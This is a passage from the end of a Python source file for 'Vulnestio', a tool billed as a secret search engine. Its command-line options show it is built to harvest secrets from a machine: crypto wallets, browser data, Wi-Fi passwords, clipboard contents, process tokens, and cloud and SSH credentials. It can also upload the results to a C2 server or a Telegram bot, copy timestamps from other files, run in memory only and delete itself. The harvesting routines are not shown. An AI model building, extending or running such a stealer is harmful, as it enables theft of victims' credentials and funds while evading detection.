        except KeyboardInterrupt:
            pass
        
        except PermissionError:
            log_str = f"[!] Permission error: {self.full_path if self.full_path else 'unknown path'} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:
                print(log_str)
            
            else:
                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "!" + Fore.YELLOW + "] " + Fore.LIGHTRED_EX + "Permission error: " + Fore.WHITE + f"{self.full_path if self.full_path else 'unknown path'} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
            
            self.logging(log_str)
            time.sleep(self.timeout)
        
        except Exception as e:
            log_str = f"[!] Error: {e} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:
                print(log_str)
                
            else:

                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "!" + Fore.YELLOW + "] " + Fore.RED + "Error: " + Fore.WHITE + f"{e} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
            
            
            self.logging(log_str)
            time.sleep(self.timeout)
    
        finally:

           

            if self.wifi_profiles:
                self.get_wifi_profiles()

            if self.ignore:
                
                log_str = f"[|] TOTAL IGNORED: {self.total_ignored} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                if self.no_color:
                    print(f"[|] TOTAL IGNORED: {self.total_ignored} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                else:
                    print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "|" + Fore.YELLOW + "] " + Fore.GREEN + "TOTAL IGNORED: " + Fore.WHITE + f"{self.total_ignored} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                    self.logging(log_str)

            if self.wallet_hunter:
                log_str = f"[|] TOTAL WALLETS FOUND: {self.total_wallets_found} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                if self.no_color:
                    print(log_str)
                
                else:
                
                    print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "|" + Fore.YELLOW + "] " + Fore.LIGHTMAGENTA_EX + "TOTAL WALLETS FOUND: " + Fore.WHITE + f"{self.total_wallets_found} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                self.logging(log_str)

                self.total_time = time.time() - self.timer
                    

            self.total_time = time.time() - self.timer
            log_str = f"[|] TOTAL FOUND: {self.total_found} | Vulnestio completed in {self.total_time:.2f} seconds"

            if self.no_color:
                print(log_str)

            else:
                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "|" + Fore.YELLOW + "] " + Fore.GREEN + "TOTAL FOUND: " + Fore.WHITE + f"{self.total_found} | " + Fore.CYAN + f"Vulnestio completed in {self.total_time:.2f} seconds")
                
            self.logging(log_str)

            if self.hash_mode:

                log_str = f"[|] TOTAL DUPLICATES MISSED: {self.duplicate} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                self.logging(log_str)
                if self.no_color:
                    print(log_str)
                    
                else:
                    print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "|" + Fore.YELLOW + "] " + Fore.GREEN + "TOTAL DUPLICATES MISSED " + Fore.WHITE + f"{self.duplicate} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                self.logging(log_str)

            
            if self.self_destruction:
                self.destruction()


        return True

        


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Vulnestio - a search engine for secrets")
    parser.add_argument("-g", "--generate-report", action="store_true", help="Generates an HTML report with statistics on the information found")
    parser.add_argument("-t", "--timeout", type=float, default=0.0, help="Timeout in N seconds after finding the key") #Готово
    parser.add_argument("-l", "--log", nargs="?", const="auto", default=None, help="File with logging of found keys. If specified without value, auto-generated filename with date/time will be used") #Готово
    parser.add_argument("--log-mode", choices=["w", "a"], default="a",help="Log mode: w = overwrite, a = append (default: a)") #Готово
    parser.add_argument("-c", "--count", type=int, default=None, help="Searches for only N keys and exits") #Готово 
    parser.add_argument("-i", "--ignore", action="store_true", help="Ignore system folders to speed up work") #Готово
    parser.add_argument("-no", "--no-color", action="store_true", help="Displaying information without color highlighting") #Готово
    parser.add_argument("-ao", "--aggressive-only", action="store_true", help="Search only for potentially vulnerable keys") #Готово
    parser.add_argument("-ms", "--memory-scanner", action="store_true", help="Full RAM scan")
    parser.add_argument("-pb", "--progress-bar", action="store_true", help="Progress bar for search visualization")
    parser.add_argument("-thr", "--threads", type=int, help="The number of N threads to speed up the work significantly")
    parser.add_argument("-wh", "--wallet-hunter", action="store_true", help="Search for crypto wallets") #Готово
    parser.add_argument("-ss", "--service-scanner", action="store_true", help="Scanning and analyzing open system ports")
    parser.add_argument("-brh", "--browser-hunter", action="store_true", help="Searching for information in browsers")
    parser.add_argument("-dd", "--dump-data", type=str, help="Uploading data to the target C2 server")
    parser.add_argument("-sd", "--self-destruction", action="store_true", help="Self-destruction after completion of work")  #Готово
    parser.add_argument("-pd", "--proc-dump", action="store_true", help="Dump tokens from processes")
    parser.add_argument("-dc", "--dump-clipboard", action="store_true", help="Dump information from the clipboard")
    parser.add_argument("-hh", "--history-hunter", action="store_true", help="Searching for information in the system command history")
    parser.add_argument("-bh", "--browser-history", action="store_true", help="Searching for information in browser history")
    parser.add_argument("-wp", "--wifi-profiles", action="store_true", help="Finding Wi-Fi passwords on Windows") #Готово 
    parser.add_argument("-dll", "--dll-hunt", action="store_true", help="Searching .dll files") #Готово
    parser.add_argument("-ts", "--timestomp", type=str, help="Copies timestamps from the specified file")
    parser.add_argument("-mo", "--memory-only", action="store_true", help="Executing code in memory without saving it to disk")
    parser.add_argument("-sc", "--smartcard", action="store_true", help="Reading smartcards")
    parser.add_argument("-usb", "--usb-hunter", action="store_true", help="Reading USB stories")
    parser.add_argument("-git", "--git-hunt", action="store_true", help="Finding information in .git files") #Готово
    parser.add_argument("-docker", "--docker-scan", action="store_true", help="Scan Docker samples for keys inside layers") #Готово
    parser.add_argument("-mx", "--max-time", type=int, help="Maximum operating time") #Готово
    parser.add_argument("-min", "--min-size", type=int, help="Minimum file size for search") #Готово
    parser.add_argument("-max", "--max-size", type=int, help="Maximum file size for search") #Готово
    parser.add_argument("-wl", "--white-list", nargs="+", help="List of allowed directories for searching")
    parser.add_argument("-bl", "--block-list", nargs="+", help="List of unauthorized directories to search") #Готово
    parser.add_argument("-hs", "--hash", choices=['sha1', 'blake2b', 'shake_256', 'ripemd160', 'sha512_224', 'md5', 'sha384', 'md5-sha1', 'sha3_512', 'sha3_256', 'sha512', 'blake2s', 'sm3', 'sha224', 'sha3_384', 'shake_128', 'sha256', 'sha512_256', 'sha3_224'], default="sha256", help="Hashing a file to find unique keys and discarding duplicate keys")
    parser.add_argument("-gmail", "--email-report", action="store_true", help="Forwarding the report to your email address")
    parser.add_argument("-tg", "--telegram-bot-report", action="store_true", help="Forwarding a message to your Telegram bot using an API token") 
    parser.add_argument("-sql", "--sql-hunt", action="store_true", help="Search for .sql files and other SQL-like files") #Готово 
    parser.add_argument("-k8sh", "--k8s-hunt", action="store_true", help="Search for Kubernetes secrets") #Готово
    parser.add_argument("-ehv", "--env-hunt", action="store_true", help="Search for .env files") #Готово
    parser.add_argument("-ssh", "--ssh-history", action="store_true", help="Searching SSH History")
    parser.add_argument("-slack", "--slack-hunt", dest="slack_hunt", action="store_true", help="Find Slack tokens in files") #Готово
    parser.add_argument("-aws", "--aws-hunt", dest="aws_hunt", action="store_true", help="AWS key lookup") #Готово 
    parser.add_argument("-npm", "--npm-hunt", action="store_true", help="Search for keys and tokens in npm packages") #Готово
    parser.add_argument("-pip", "--pip-hunt", action="store_true", help="Search for keys in Python package files") #Готово
    parser.add_argument("-comp", "--composer-hunt", action="store_true", help="Search for PHP keys and tokens") #Готово
    parser.add_argument("-crh", "--compress-hunt", action="store_true", help="Search archives") #Готово
    parser.add_argument("-go", "--golang-hunt", action="store_true", help="Search for keys in Go modules") #Готово
    parser.add_argument("-redis", "--redis-hunt", action="store_true", help="Search for Redis dump files containing potential session data")  #Готово
    parser.add_argument("-mysql", "--mysql-hunt", action="store_true", help="Search for MySQL dump files containing credentials")  #Готово 
    parser.add_argument("-pgsql", "--postgres-hunt", action="store_true", help="Search for PostgreSQL dump files containing credentials") #Готово
    parser.add_argument("-mongo", "--mongodb-hunt", action="store_true", help="Search for MongoDB dump files") #Готово
    parser.add_argument("-elastic", "--elastic-hunt", action="store_true", help="Search for Elasticsearch snapshots and indices containing tokens") #Готово

    args = parser.parse_args()

    log_filename = None

    if args.log == "auto":  
        log_filename = f"./logs/{datetime.datetime.now().strftime('%d_%m_%Y_%H_%M_%S')}_logs.txt"
        print(f"Logging enabled, auto-generated filename: {log_filename}")

    elif args.log:  
        log_filename = args.log



    vulnestio = Vulnestio(
        timeout=args.timeout,
        log=log_filename,
        log_mode=args.log_mode,
        ignore=args.ignore,  
        no_color=args.no_color,
        aggressive_only=args.aggressive_only,
        memory_scanner=args.memory_scanner,
        progress_bar=args.progress_bar,
        threads=args.threads,
        wallet_hunter=args.wallet_hunter,
        service_scanner=args.service_scanner,
        browser_hunter=args.browser_hunter,
        dump_data=args.dump_data,
        self_destruction=args.self_destruction,
        proc_dump=args.proc_dump,
        dump_clipboard=args.dump_clipboard,
        history_hunter=args.history_hunter,
        browser_history=args.browser_history,
        wifi_profiles=args.wifi_profiles,
        dll_hunt=args.dll_hunt,
        timestomp=args.timestomp,
        memory_only=args.memory_only,
        smartcard=args.smartcard,
        usb_hunter=args.usb_hunter,
        git_hunt=args.git_hunt,
        docker_scan=args.docker_scan,
        max_time=args.max_time,
        min_size=args.min_size,
        max_size=args.max_size,
        white_list=set(args.white_list) if args.white_list else None,
        block_list=set(args.block_list) if args.block_list else None,
        hash_mode=args.hash,
        email_report=args.email_report,
        telegram_bot_report=args.telegram_bot_report,  
        sql_hunt=args.sql_hunt,
        k8s_hunt=args.k8s_hunt,
        env_hunt=args.env_hunt,
        ssh_history=args.ssh_history,
        slack_hunt=args.slack_hunt,
        aws_hunt=args.aws_hunt, 
        npm_hunt=args.npm_hunt,
        pip_hunt=args.pip_hunt,
        composer_hunt=args.composer_hunt,
        compress_hunt=args.compress_hunt,
        golang_hunt=args.golang_hunt,
        redis_hunt=args.redis_hunt,
        mysql_hunt=args.mysql_hunt,
        postgres_hunt=args.postgres_hunt,
        mongodb_hunt=args.mongodb_hunt,
        elastic_hunt=args.elastic_hunt,
        generate_report=args.generate_report,
        count=args.count,
    )


    vulnestio.search()

